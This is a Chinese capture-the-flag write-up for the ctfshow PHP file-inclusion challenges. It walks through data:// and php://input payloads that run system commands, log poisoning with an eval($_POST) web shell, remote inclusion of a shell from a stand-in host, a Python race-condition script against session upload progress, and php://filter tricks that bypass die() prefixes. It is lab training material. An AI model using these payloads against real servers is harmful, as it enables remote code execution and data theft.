---
title: ctfshow文件包含
date: 2025-09-05 18:21:01
tags:
- CTF
- Web
- 文件包含漏洞
- 日志包含
- 木马上传
- session条件竞争
categories:
- ctfshow-web入门wp
description: " "
---



# web78

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

<br>

**==题解一==**

**文件包含**

```php
?file=php://filter/convert.base64-encode/resource=flag.php
```



<img src="\images\article_images\image-20250801171241071.png" alt="image-20250801171241071" style="zoom: 25%;" />

<br>



<img src="\images\article_images\image-20250801171316898.png" alt="image-20250801171316898" style="zoom: 25%;" />

<br>



**==题解二==**

**伪协议**

**查看目录下文件**

```php
?file=data://text/plain,<?php system("ls") ?>
```

<img src="\images\article_images\image-20250801172202035.png" alt="image-20250801172202035" style="zoom:33%;" />

<br>



```php
?file=data://text/plain,<?php system("tac flag.php") ?>
```

<img src="\images\article_images\image-20250801171557675.png" alt="image-20250801171557675" style="zoom: 25%;" />

<br>



**==题解三==**

**思路**

**Nginx 的日志文件 `access.log` 是一个文本文件，记录了用户请求信息。**

**如果我们将一段PHP 代码写进日志，再通过 `include('access.log')`，PHP 会执行其中的代码。**

**我们构造 POST 请求传参，实现 命令执行（RCE）。**





> **Nginx 默认日志路径**
>
> **如果服务器使用的是 Nginx，默认的日志路径通常是：**
>
> - **访问日志（access log）：**
>
>   ```bash
>   /var/log/nginx/access.log
>   ```
>
> - **错误日志（error log）：**
>
>   ```bash
>   /var/log/nginx/error.log
>   ```
>
> **这个路径来源于默认配置文件 `/etc/nginx/nginx.conf` 中的一段：**
>
> ```
> access_log  /var/log/nginx/access.log;
> error_log   /var/log/nginx/error.log;
> ```
>
> <br>
>
>  <br>
>
> **Apache 默认日志路径**
>
> **如果使用的是 Apache（httpd）：**
>
> - **访问日志：**
>
>   ```
>   /var/log/apache2/access.log
>   ```
>
> - **错误日志：**
>
>   ```
>   /var/log/apache2/error.log
>   ```
>
> **或在某些系统中（如 CentOS）：**
>
> ```
> /var/log/httpd/access_log
> /var/log/httpd/error_log
> ```
>
> **这些也都由 Apache 的配置文件 `/etc/httpd/conf/httpd.conf` 或 `/etc/apache2/apache2.conf` 决定。**



**访问日志**

```php
?file=../../../../var/log/nginx/access.log
```

<img src="\images\article_images\image-20250801210238666.png" alt="image-20250801210238666" style="zoom:25%;" />

<br>



**构造 User-Agent 使其被写入 access.log（日志包含目标）**

```php
<?php eval($_POST[a]); ?>
```

 

<img src="\images\article_images\image-20250801210209458.png" alt="image-20250801210209458" style="zoom:25%;" />

<br>

**post请求**

```php
a=system("tac flag.php");
```

<img src="\images\article_images\image-20250801210122212.png" alt="image-20250801210122212" style="zoom:25%;" />

<br>



> **访问页面时，Nginx 会记录以下信息：**
>
> - **访问的 URL**
> - **IP 地址**
> - **请求方法（GET/POST）**
> - **User-Agent**
> - **Referer 等**
>
> **日志格式长这样：**
>
> ```bash
> 127.0.0.1 - - [01/Aug/2025:12:34:56 +0800] "GET /index.php HTTP/1.1" 200 123 "-" "<?php eval($_POST['a']); ?>"
> ```
>
> 这个最后的 `<?php eval($_POST['a']); ?>"` 就是在请求里写的 `User-Agent`。



<br>

---

# web79

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

**过滤了 `php`**

<br>

**==题解一==**

**换成大写 或者 利用短标签替换 `php`**

```php
?file=data://text/plain,<?Php system("tac flag.php") ?>
?file=data://text/plain,<?= system("tac flag.php") ?>


#甚至可以这样
?file=data://text/plain,<?PHP system("tac flag.php") ?>
?file=data://text/plain,<?= system("tac ????????") ?>
?file=data://text/plain,<?= system("tac f???.???") ?>
?file=data://text/plain,<?= system("tac flag.ph?") ?>
?file=data://text/plain,<?= system("tac f*") ?>
```

<img src="\images\article_images\image-20250801232241216.png" alt="image-20250801232241216" style="zoom: 25%;" />

<br>





**==题解二==**

**将 `<?php system("tac flag.php") ?>`**

**进行base64 编码后 `PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==`**

```php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKSA/Pg==
```



<img src="\images\article_images\image-20250802011023891.png" alt="image-20250802011023891" style="zoom:80%;" />

<br>



**==题解三==**

**GET**

```
?file=data://text/plain,<?= eval($_POST[a]);?>
```

**POST**

```
a=system("tac flag.php");
```







<img src="\images\article_images\image-20250802002404164.png" alt="image-20250802002404164" style="zoom:25%;" />

<br>



**==题解四==**

> **`php://input` 是一个PHP协议，允许把请求体当做PHP代码文件包含执行。**
>
> **直接访问 `php://input`，可以把HTTP请求的请求体当作PHP代码执行。**



**这种解法需要在bp操作**

```php
?file=Php://input
```



<img src="\images\article_images\image-20250802003525091.png" alt="image-20250802003525091" style="zoom: 33%;" />

<br>



```php
<?Php system('tac flag.php')?>
```



<img src="\images\article_images\image-20250802010453916.png" alt="image-20250802010453916" style="zoom:33%;" />

<br>



**==题解五==**

**日志包含**

```php
?file=../../../../var/log/nginx/access.log

    
#User-Agent
<?= eval($_POST[a]); ?>
    
    
#POST
a=system("tac flag.php");
```



<img src="\images\article_images\image-20250801212138779.png" alt="image-20250801212138779" style="zoom:80%;" />

<br>





---

# web80

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:26:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

**过滤了 `php` `data`**

<br>

**==题解一==**

**日志包含**

**这次日志路径为 `/var/log/nginx/access.log`**

**查看目录**

```php
?file=/var/log/nginx/access.log

    
#User-Agent
<?= eval($_POST[a]); ?>
    
    
#POST
a=system("ls");
```



<img src="\images\article_images\image-20250802095400414.png" alt="image-20250802095400414" style="zoom: 20%;" />

<br>



**flag文件名变换为 `fl0g.php`**

```php
?file=/var/log/nginx/access.log

    
#User-Agent
<?= eval($_POST[a]); ?>
    
    
#POST
a=system("tac fl0g.php");
```



<img src="\images\article_images\image-20250802095442524.png" alt="image-20250802095442524" style="zoom: 20%;" />

<br>

**==题解二==**

**远程文件 `http://your-shell.com/1` 是 PHP 脚本，内容如下：**

```php
<?php
    eval($_POST[1]);
?>
```

<img src="\images\article_images\image-20250802101056417.png" alt="image-20250802101056417" style="zoom:33%;" />

<br>

**利用远程文件 `http://your-shell.com/1` 进行POST**

```php
?file=http://your-shell.com/1

#POST
1=system("ls");
1=system("tac fl0g.php");
```

<img src="\images\article_images\image-20250802101442503.png" alt="image-20250802101442503" style="zoom:25%;" />

<br>



**==题解三==**

```php
?file=Php://input

#请求内容
<?php system("ls") ?>
```

<img src="\images\article_images\image-20250802102359566.png" alt="image-20250802102359566" style="zoom:33%;" />

<br>



```php
?file=Php://input

#请求内容
<?php system("cat fl0g.php") ?>
```



<img src="\images\article_images\image-20250802102504525.png" alt="image-20250802102504525" style="zoom:33%;" />

<br>



---

# web81

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 15:51:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

**过滤了 `php` `data` `:`**

<br>

**==题解一==**

**查看目录**

**注意`<?= file_get_contents("http://your-shell.com/1"); ?>` 需要添加在原 `UA` 内容空一格后面（这道题服务器端会对 `UA` 格式进行检查，需要保留原`UA` 内容）**

```php
?file=/var/log/nginx/access.log

    
#User-Agent
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 <?= eval($_POST[a]); ?>
    
    
#POST
a=system("ls");
a=system("tac fl0g.php");
```

<img src="\images\article_images\image-20250802235003792.png" alt="image-20250802235003792" style="zoom: 25%;" />

<br>

<img src="\images\article_images\image-20250802235043666.png" alt="image-20250802235043666" style="zoom:25%;" />

<br>



**==题解二==**

**蚁剑连接**

**蚁剑一句话木马，添加在 `UA` 后面，传入日志**

```php
<?php @eval($_POST[a]); ?>
```

<img src="\images\article_images\image-20250803001820134.png" alt="image-20250803001820134" style="zoom:25%;" />

<br>

**连接蚁剑，密码为传入的字段**

<img src="\images\article_images\image-20250803002003634.png" alt="image-20250803002003634" style="zoom:33%;" />

<br>

**使用虚拟终端拿到flag**

<img src="\images\article_images\image-20250803003532075.png" alt="image-20250803003532075" style="zoom:33%;" />

<br>

**或者直接查看flag文件**

<img src="\images\article_images\image-20250803003725310.png" alt="image-20250803003725310" style="zoom:33%;" />

<br>









---

# web82

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 19:34:45
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

<br>

**==题解一==**

**思路：利用 PHP 的上传进度功能 `session.upload_progress` 把恶意代码注入到服务器临时 `session` 文件中，然后再用 `include()` 把这个临时文件包含执行。**

<br>

**知识储备：如果在 `cookie` 中设置 `PHPSESSID`（即 `session` 值）= `flag`，那么会在服务器上创建一个 `/tmp/sess_flag` 文件；对于默认配置，文件内容上传后会被清除，那么我们需要进行环境竞争，在删除之前，对该文件进行文件包含，从而进行命令执行。**

> **php中的 `session.upload_progress` :   [PHP: Session 上传进度 - Manual](https://www.php.net/manual/zh/session.upload-progress.php)**

在 `php.ini` 有其中以下几个**默认选项**

```ini
1. session.upload_progress.enabled = on
2. session.upload_progress.cleanup = on
3. session.upload_progress.prefix = "upload_progress_"
4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
5. session.use_strict_mode=off
```

<br>

- **`session.upload_progress.enabled = On`**

  - 📌 **作用：**
    是否启用 **上传进度追踪功能**。
  - ✅ **启用时：**
    当客户端通过表单上传文件，并且表单里含有 `PHP_SESSION_UPLOAD_PROGRESS` 字段时，
     PHP 会自动把此次文件上传的详细信息(如上传时间、上传进度等)写入到对应的 `session` 文件中。
  - ❌ **关闭时：**
    PHP 不会记录上传进度，即使你表单里加了 `PHP_SESSION_UPLOAD_PROGRESS` 字段，也不会有任何效果。

- **`session.upload_progress.cleanup = On`**

  - 📌 **作用：**
    控制 **上传完成后，是否自动删除上传进度信息**。

  - ✅ **On（默认）：**
    上传一完成，PHP 会**自动清除 session 文件中那段上传进度内容**（包括你伪造的 `<?php ... ?>`）。

    也就是说，恶意内容会在上传后很快被删掉，**留给攻击者操作的窗口非常短**。

  - ❌ **Off：**

    上传完成后，上传进度内容会一直保留在 `session` 文件中，直到这个 `session` 超时或被手动清理。

- **`session.upload_progress.prefix = "upload_progress_"`**

  - 📌 **作用：**

    设置写入 `session` 文件时的 key 前缀。
    默认是 `"upload_progress_"`，所以写入内容的键名是：

    ```php
    upload_progress_<随机值>
    ```

    比如你上传时，如果设置了表单字段：

    ```php
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system('ls'); ?>" />
    ```

    那最终写入 `session` 文件的内容可能是：

    ```php
    upload_progress_1234|a:6:{
      "start":...,
      "content":"<?php system('ls'); ?>",
      ...
    }
    ```

- **`session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"`**

  - 📌 **作用：**
    指定 **表单里用于传递上传进度追踪 ID 的字段名**。
    默认是：

    ```html
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="..." />
    ```

    这个字段值就是上传 ID，也就是 `upload_progress_<这个值>`。
    如果你设置：

    ```ini
    session.upload_progress.name = "PROGRESS_ID"
    ```

    那你就必须这样写：

    ```html
    <input type="hidden" name="PROGRESS_ID" value="<?php system('ls'); ?>" />
    ```

    否则 PHP 就不会追踪这个上传进度了。

- **`session.use_strict_mode = Off`**

  - 📌 **作用：**
    控制 **PHP 在创建 `session` 时是否检查 `session ID` 的有效性**。

  - 假设设置如下：

    ```ini
    session.use_strict_mode = Off
    ```

    然后你请求网站时伪造了 `cookie`：

    ```http
    Cookie: PHPSESSID=love
    ```

    但服务器上 `/tmp/sess_love` 文件根本不存在。

    ✅ 如果 `strict_mode` 是 `Off`：

    - PHP 会 **接受你伪造的 `session ID`**
    - 并且 **自动创建一个新的 `/tmp/sess_love` 文件**
    - 攻击者就能指定 `session` 文件的名字，配合题目中的 `include()`，非常危险！

    ❌ 如果 `strict_mode` 是 `On`：

    - PHP 会发现你提交的 `session ID`（如 `love`）在服务器上不存在
    - **拒绝使用这个伪造的 `session ID`**
    - 会自动给你重新生成一个随机的合法 ` session ID`
    - 你无法预测 `session` 文件名，payload 也没法写进指定的文件

<br>

**==题解一==**

**利用 `POST.html` 上传任意一个文件**

**注意在相应位置修改靶机地址和命令**

```html
<!DOCTYPE html>
<html>
<body>
<!-- 修改靶机地址 -->
<form action="http://ca852e6a-5dde-48a7-995d-6e6fc0953fdb.challenge.ctf.show//" method="POST" enctype="multipart/form-data">
<!-- 修改命令 -->
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php system('ls'); ?>" />
<input type="file" name="file" />
<input type="submit" value="submit" />
</form>
</body>
</html>
<?php
session_start();
?>
```

<br>

**抓包后，在 `cookie` 后添加 `PHPSESSID=love`（ `PHPSESSID` 的值任意）**

**如下示例**

```ini
Cookie: ccccooookkkkiiiieee; PHPSESSID=love
```

<img src="\images\article_images\image-20250804001653557.png" alt="image-20250804001653557" style="zoom:33%;" />

<br>



**将抓到的包发送到 `Intruder` 爆破模块，注意没有 `payload` 插入点**

**设置 `Payload type` 为 `Null payloads`**

**勾选 `Continue indefinitely` 无限重复**

<img src="\images\article_images\image-20250804002512882.png" alt="image-20250804002512882" style="zoom:33%;" />

<br>

**新建 `Resource pool` 资源池，设置线程 `30`**

**`Start attack` 开始爆破，不断上传文件**

<img src="\images\article_images\image-20250805162000310.png" alt="image-20250805162000310" style="zoom:33%;" />

<br>





**访问 `靶机?file=/tmp/sess_love` 并抓包**

<img src="\images\article_images\image-20250804002722557.png" alt="image-20250804002722557" style="zoom:25%;" />

<br>



**同上（这里不需要对 `cookie` 进行修改处理）**

**将抓到的包发送到 `Intruder` 爆破模块，注意没有 `payload` 插入点**

**设置 `Payload type` 为 `Null payloads`**

**勾选 `Continue indefinitely` 无限重复**

<img src="\images\article_images\image-20250804002512882.png" alt="image-20250804002512882" style="zoom:33%;" />

<br>

**新建 `Resource pool` 资源池，设置线程 `80` (访问包的线程数需要大于上传包的线程数)**

**`Start attack` 开始爆破，不断访问文件**

<img src="\images\article_images\image-20250805162212020.png" alt="image-20250805162212020" style="zoom:33%;" />

<br>

**查看访问 `靶机?file=/tmp/sess_love` 的包的爆破结果**

**根据 `Length` 长度的不同找到命令的回显**

<img src="\images\article_images\image-20250804005056379.png" alt="image-20250804005056379" style="zoom:33%;" />

<br>











<img src="\images\article_images\image-20250805161317653.png" alt="image-20250805161317653" style="zoom:80%;" />

<br>

<br>

<img src="\images\article_images\image-20250804005515129.png" alt="image-20250804005515129" style="zoom: 80%;" />

<br>







**==题解二==**

**`ctfshow82.py` 多线程并发注入 + 读取 + 停止控制脚本（速度极快）**

```python
import io
import requests
import threading
import time

# === [1] 靶机地址 ===
url = 'http://18f03190-5919-406c-a800-d21ef782a4ec.challenge.ctf.show/'

# === [2] 自定义参数 ===
PHPSESSID = 'flag'
PAYLOAD = '<?php system("cat fl0g.php");?>mylove'   # 修改命令，自定义标识符
IDENTIFIER = 'mylove'  # 用于判断是否成功执行
TARGET_SESS_PATH = '/tmp/sess_flag'  # 修改读取地址

# === [3] 线程控制器 ===
found_flag = threading.Event()

# === [4] 上传线程：持续伪造上传进度 ===
def upload_payload(session, thread_id):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': PAYLOAD
    }

    while not found_flag.is_set():
        try:
            fake_file = io.BytesIO(b'A' * 1024 * 10)  # 10KB 文件
            session.post(
                url,
                cookies={'PHPSESSID': PHPSESSID},
                data=data,
                files={'file': (f'upload_{thread_id}.txt', fake_file)},
                timeout=3
            )
            print(f'[Upload-{thread_id}] Upload OK')
        except Exception as e:
            print(f'[Upload-{thread_id}] Error: {e}')

# === [5] 读取线程：不断读取 sess 文件，等待触发执行 ===
def read_session(session, thread_id):
    while not found_flag.is_set():
        try:
            response = session.get(f'{url}?file={TARGET_SESS_PATH}', timeout=2)   # 修改靶机读取地址
            if IDENTIFIER in response.text:
                print(f'\n[+] [Read-{thread_id}] Payload executed successfully!\n')
                print(response.text)
                found_flag.set()
                break
            else:
                print(f'[-] [Read-{thread_id}] Not ready')
        except Exception as e:
            print(f'[Read-{thread_id}] Error: {e}')
        time.sleep(0.2)

# === [6] 主控函数：并发调度线程 ===
def main():
    session = requests.Session()
    threads = []

    # 启动多个上传线程
    for i in range(3):
        t = threading.Thread(target=upload_payload, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 启动多个读取线程
    for i in range(5):
        t = threading.Thread(target=read_session, args=(session, i))
        t.daemon = True
        t.start()
        threads.append(t)

    # 等待直到有线程设置 found_flag
    while not found_flag.is_set():
        time.sleep(0.2)

    print("\n[+] Done. Exiting all threads.")

# === [7] 执行入口 ===
if __name__ == '__main__':
    main()

```







<img src="\images\article_images\image-20250807012753787.png" alt="image-20250807012753787" style="zoom:33%;" />

<br>



<img src="\images\article_images\image-20250807012915867.png" alt="image-20250807012915867" style="zoom:33%;" />

<br>

---

# web83

```php
Warning: session_destroy(): Trying to destroy uninitialized session in /var/www/html/index.php on line 14
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 20:28:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
session_unset();
session_destroy();

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);

    include($file);
}else{
    highlight_file(__FILE__);
}
```

**题解同web82**



<img src="\images\article_images\image-20250807020107570.png" alt="image-20250807020107570" style="zoom:33%;" />

<br>

---

# web84

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 20:40:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    system("rm -rf /tmp/*");
    include($file);
}else{
    highlight_file(__FILE__);
}
```

<br>

**`rm -rf /tmp/*` 强制递归地删除 `/tmp` 目录下的所有文件和子目录。**

- **`rm`：删除文件或目录的命令。**
- **`-r`：递归删除，表示如果是目录，则删除目录内所有内容。**
- **`-f`：强制删除，不会提示确认。**
- **`/tmp/*`：`/tmp` 目录下的所有文件和文件夹（`*` 是通配符，匹配所有文件和目录）。**

**其实 `session.upload_progress.cleanup = on` 本身就会进行清空**

<br>

**题解同web82**

**（可通过降低上传线程、增大读取线程、降低`time.sleep` 更快得到回显）**

<img src="\images\article_images\image-20250807020302836.png" alt="image-20250807020302836" style="zoom:80%;" />

<br>

---

# web85

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 20:59:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    if(file_exists($file)){
        $content = file_get_contents($file);
        if(strpos($content, "<")>0){
            die("error");
        }
        include($file);
    }
    
}else{
    highlight_file(__FILE__);
}
```

<br>

**增加**

```php
if(file_exists($file)){
    $content = file_get_contents($file);
    if(strpos($content, "<") > 0){
        die("error");
    }
}
```

- **`if(file_exists($file)){`**
  **判断变量 `$file` 指定的文件是否存在。如果存在，进入代码块。**

- **`$content = file_get_contents($file);`**
  **读取该文件的全部内容，赋值给 `$content` 变量。**

- **`if(strpos($content, "<") > 0){`**
  **`strpos` 是查找字符串中某个字符或子串首次出现的位置。**
  **这里查找字符串 `"<"`（小于号）在 `$content` 中第一次出现的位置。**
  **返回值是数字（首次出现的下标），或者 `false`（没找到）。**
  **这里用 `> 0` 判断：表示只有当 `"<"` 出现在第1个及之后的位置时（下标大于0）才进入判断。**
  **注意，这里如果 `"<"` 出现在字符串开头（下标0），不会触发条件。**

- **`die("error");`**
  **直接终止程序运行，输出 `error`。**

<br>

**依旧可以选择脚本解题**

<br>

**题解同web82**

<img src="\images\article_images\image-20250809001445881.png" alt="image-20250809001445881" style="zoom:33%;" />

<br>

<img src="\images\article_images\image-20250809001640338.png" alt="image-20250809001640338" style="zoom: 25%;" />

<br>

---

# web86

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:20:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
define('还要秀？', dirname(__FILE__));
set_include_path(还要秀？);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);

    
}else{
    highlight_file(__FILE__);
}
```

<br>

`define('还要秀？', dirname(__FILE__));`

- `define` 是 PHP 定义常量的函数，第一个参数是常量名（字符串），第二个参数是常量值。
- 这里定义了一个名为 `'还要秀？'` 的常量（中文名常量是允许的，只要符合 PHP 标识符规范就行，但中文名一般不推荐）。
- `dirname(__FILE__)` 返回当前文件所在目录的绝对路径，比如 `/var/www/html`。
- 因此，这条语句是将当前文件所在目录路径赋值为常量 `'还要秀？'` 。



2. `set_include_path(还要秀？);`

- `set_include_path()` 是 PHP 用来设置 **`include 路径`** 的函数，也就是 `include`、`require` 等函数查找文件的目录。
- 参数是一个字符串，表示新的包含路径。
- 这里传入了常量 `还要秀？` （之前定义的当前目录路径）。
- 也就是说，`include_path` 被设置成了当前脚本所在的目录。

设置 PHP 的包含路径为当前文件的目录路径。这样在后续代码中使用 `include()`  时，可以省略文件的完整路径，只需提供文件名。

当使用 `include()`、`require()`、`include_once()` 或 `require_once()` 时，如果提供的路径既不是绝对路径也不是相对路径，PHP 会首先在 `include_path` 设置的目录中查找文件。



<br>

**题解同web82**

<img src="\images\article_images\image-20250809001850778.png" alt="image-20250809001850778" style="zoom: 25%;" />

<br>

---

# web87

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:57:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);

    
}else{
    highlight_file(__FILE__);
}
```

<br>

>**base64编码只包含64个可打印字符，而php解码base64时遇到不在其中的字符，会忽略掉，将合法字符进行组合变成一个字符串进行解码，所以`<?php die('大佬别秀了');?>` 对其解码后，只有`phpdie`六个字符组成字符串进行解码**
>
>**base64算法解码时是4个 `byte`一组，为了绕过 `die` ，需要在`content` base64编码后的前面加上两个字母**

```php
?file=php://filter/write=convert.base64-decode/resource=1.php
```

**因为题目中有 `urldecode($file)` ，所以我们需要对其进行两次URL编码**

```php
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
```

**POST**

**对一句话木马  `<?php @eval($_POST[a]);?>` 进行base64编码得到`PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==`并在前面加上两个字母**

```php
content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
```

<br>

**之后可实现远程代码执行**

**POST**

```php
a=system("ls");
```

<img src="\images\article_images\image-20250809141916723.png" alt="image-20250809141916723" style="zoom:25%;" />

<br>

**POST**

```php
a=system("tac fl0g.php");
```

<img src="\images\article_images\image-20250809141949995.png" alt="image-20250809141949995" style="zoom:25%;" />

<br>

---

# web88

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-17 02:27:25
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

 */
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
}
```

<br>

**将 `<?php system(“ls”); ?>` 经base64编码得 `PD9waHAgc3lzdGVtKCJscyIpOyA/Pg==`**

**由于过滤符号，所以将  `==` 去掉**

```php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA/Pg
```

<img src="\images\article_images\image-20250809154753979.png" alt="image-20250809154753979" style="zoom:25%;" />

<br>

```php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4
```

<img src="\images\article_images\image-20250809160357104.png" alt="image-20250809160357104" style="zoom: 25%;" />

<br>

---

# web116

**题目提示 `lfi` (php本地文件包含漏洞)**

```php
?file=index.php
```

<img src="\images\article_images\image-20250809161138619.png" alt="image-20250809161138619" style="zoom: 25%;" />

<br>

**查看源代码得到**

```php
<?php
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=isset($_GET['file'])?$_GET['file']:"5.mp4";
filter($file);
header('Content-Type: video/mp4');
header("Content-Length: $file");
readfile($file);
?>
```

<br>

```php
/index.php?file=flag.php
```

**查看源代码**

<img src="\images\article_images\image-20250810105105695.png" alt="image-20250810105105695" style="zoom: 25%;" />

<br>

---

# web117

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: yu22x
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 18:16:59

*/
highlight_file(__FILE__);
error_reporting(0);
function filter($x){
    if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){
        die('too young too simple sometimes naive!');
    }
}
$file=$_GET['file'];
$contents=$_POST['contents'];
filter($file);
file_put_contents($file, "<?php die();?>".$contents);
```

<br>

1. **`iconv()` 函数概述**

`iconv()` 是 PHP 用来进行字符编码转换的函数：

```php
string iconv ( string $in_charset , string $out_charset , string $str )
```

- `$in_charset`：输入字符串的当前编码格式，比如 `UTF-8`、`GBK`、`ISO-8859-1`、`UCS-2` 等。
- `$out_charset`：转换成目标编码格式。
- `$str`：需要转换的字符串。

**功能**：把 `$str` 从 `$in_charset` 编码转换成 `$out_charset` 编码。

<br>

2. **`convert.iconv.` 伪协议（Filter）**

PHP 的 `php://filter` 允许你对数据流进行过滤。`convert.iconv.` 过滤器就是用来做字符编码转换的，效果相当于在流读取/写入过程中执行 `iconv()`。

用法举例：

```php
php://filter/convert.iconv.UTF-8/GBK/resource=file.txt
```

这表示读取 `file.txt`，然后把内容从 `UTF-8` 转成 `GBK`。

<br>

3. **UCS-2 编码**

UCS-2 是一种固定长度的字符编码，使用两个字节（16 位）来编码一个字符。它是 UTF-16 的前身，但不支持代理对（surrogate pairs），只编码基本多文种平面。

- **特点**：
  - 每个字符占用 2 字节（2 个字节 = 16 位）。
  - 因此处理 UCS-2 编码字符串时，必须保证字符串的字节数是偶数。

<br>

4. **字节序（Endian）**

字节序指的是多字节数据在存储或传输时，字节的排列顺序。

